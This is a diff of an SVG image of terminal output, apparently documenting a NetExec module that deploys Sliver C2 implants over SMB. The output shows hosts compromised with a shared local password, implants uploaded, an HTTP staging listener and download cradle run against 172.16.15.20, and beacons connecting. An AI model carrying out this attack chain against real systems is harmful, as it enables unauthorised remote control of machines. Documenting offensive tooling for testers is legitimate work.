@@ -1,24 +1,19 @@
-<svg width="1100" height="240" xmlns="http://www.w3.org/2000/svg">
-<foreignObject width="1100" height="240">
-    <div xmlns="http://www.w3.org/1999/xhtml">
-<div style="background-color: black;">
-<pre style="font-weight: normal; color: #bbb; white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word; background-color: inherit;"><b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.10      445    SQL01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Windows Server 2022 Build 20348 x64 (name:SQL01) (domain:SQL01) (<b style="color: #ff5555; font-weight: normal;">signing:False</b>) (<b style="color: #55ffff; font-weight: normal;">SMBv1:None</b>)
-<b style="color: #5555ff; font-weight: ">SMB</b>         10.2.10.12      445    LINUX01          <b style="color: #5555ff; font-weight: normal;">[*]</b> Unix - Samba (name:LINUX01) (domain:LINUX01) (<b style="color: #ff5555; font-weight: normal;">signing:False</b>) (<b style="color: #55ffff; font-weight: normal;">SMBv1:None</b>)<b style="color: #ffff55; font-weight: normal;"> (Null Auth:True)</b>
-<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.11      445    DEV01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Windows Server 2022 Build 20348 x64 (name:DEV01) (domain:DEV01) (<b style="color: #ff5555; font-weight: normal;">signing:False</b>) (<b style="color: #55ffff; font-weight: normal;">SMBv1:None</b>)
-<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.10      445    SQL01            <b style="color: #55ff55; font-weight: normal;">[+]</b> SQL01\localuser:password <b style="color: #ffff55; font-weight: normal;">(Pwn3d!)</b>
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.10      445    SQL01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Generating Sliver windows/amd64 executable...
-<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.12      445    LINUX01          <b style="color: #55ff55; font-weight: normal;">[+]</b> LINUX01\localuser:password 
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.12      445    LINUX01          <b style="color: #5555ff; font-weight: normal;">[*]</b> Generating Sliver linux/386 executable...
-<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.11      445    DEV01            <b style="color: #55ff55; font-weight: normal;">[+]</b> DEV01\localuser:password <b style="color: #ffff55; font-weight: normal;">(Pwn3d!)</b>
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.11      445    DEV01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Generating Sliver windows/amd64 executable...
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.12      445    LINUX01          <b style="color: #55ff55; font-weight: normal;">[+]</b> Implant SMB upload complete
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.12      445    LINUX01          <b style="color: #ff5555; font-weight: normal;">[-]</b> SMB execute is not supported on Linux targets; skipping remote execution
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.10      445    SQL01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Implant SMB upload complete
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.11      445    DEV01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Implant SMB upload complete
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.10      445    SQL01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Beacon connected! ID: 0eabc91c-5584-4012-8d17-c15db38e4c02, Name: implant_ntsn4nkd.exe
-<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.11      445    DEV01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Beacon connected! ID: 634bbc69-7b64-4d1b-abf0-4341c394a986, Name: implant_ck2p210f.exe
-</pre>
-</div>
+<svg width="1200" height="240" xmlns="http://www.w3.org/2000/svg">
+  <rect width="100%" height="100%" fill="black"/>
+  <foreignObject x="0" y="0" width="1200" height="240">
+    <div xmlns="http://www.w3.org/1999/xhtml" 
+         style="margin:0; padding:12px; font-family:Consolas,monospace; font-size:13.5px; color:#bbb; background:black; white-space:pre; line-height:1.35;">
+<span style="color:#0ff;">SMB</span>         172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:DEV01) (<span style="color:#f55;">signing:False</span>) (<span style="color:#0ff;">SMBv1:False</span>)
+<span style="color:#0ff;">SMB</span>         172.16.15.20    445    DEV01            <span style="color:#0f0;">[+]</span> localuser:password <span style="color:#ff5;">(Pwn3d!)</span>
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Using HTTP download staging (powershell)
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Generating implant for HTTP staging...
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Generating Sliver windows/amd64 executable...
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Uploading implant to Sliver website 'nxc_77ffbf00'...
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Starting HTTP listener on 10.10.15.193:8080...
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Executing download cradle on 172.16.15.20 via smb...
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0f0;">[+]</span> Beacon connected! ID: 5b0c2874-81bc-4a2b-acc8-7b44dc421e69, Name: implant_00eqsrxl.exe
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Stopping HTTP listener (Job ID: 4)...
+<span style="color:#0ff;">SLIVER_EXEC</span> 172.16.15.20    445    DEV01            <span style="color:#0ff;">[*]</span> Removing Sliver website 'nxc_77ffbf00'...
     </div>
-</foreignObject>
+  </foreignObject>
 </svg>
